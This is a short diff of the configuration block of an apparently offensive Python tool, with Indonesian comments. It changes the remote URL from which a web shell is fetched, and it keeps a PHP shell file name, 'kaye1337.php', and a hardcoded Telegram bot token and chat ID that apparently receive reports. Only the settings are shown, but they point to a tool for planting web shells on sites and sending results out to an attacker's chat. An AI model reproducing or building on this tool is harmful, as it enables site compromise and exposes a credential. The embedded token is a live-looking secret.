@@ -11,7 +11,7 @@ from datetime import datetime
 
 # Konfigurasi
 CONFIG = {
-    "RAW_SHELL_URL": "https://raw.githubusercontent.com/la-inca/clev/refs/heads/main/punya.txt",
+    "RAW_SHELL_URL": "https://raw.githubusercontent.com/la-inca/clev/refs/heads/main/jalpin.txt",
     "BOT_TOKEN": os.getenv("BOT_TOKEN", "8559074485:AAGMwVw5bm-RNvckM4_F5vbU0Gijy7FKtwo"),
     "CHAT_ID": os.getenv("CHAT_ID", "-1003085156268"),
     "SHELL_NAME": "kaye1337.php",
